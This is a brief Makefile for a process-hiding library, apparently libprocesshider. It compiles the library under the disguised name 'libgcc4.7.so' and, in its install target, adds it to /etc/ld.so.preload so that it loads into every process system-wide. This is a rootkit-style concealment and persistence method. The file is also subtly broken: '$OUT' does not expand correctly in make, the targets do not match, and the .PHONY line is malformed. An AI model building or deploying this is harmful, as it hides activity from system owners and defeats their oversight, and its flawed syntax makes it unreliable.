OUT=libgcc4.7.so

all: libprocesshider.so

libprocesshider.so: processhider.c
	gcc -Wall -fPIC -shared -o $OUT processhider.c -ldl

install:
	cp $OUT /usr/local/lib
	echo /usr/local/lib/$OUT >> /etc/ld.so.preload

.PHONY clean:
	rm -f $OUT
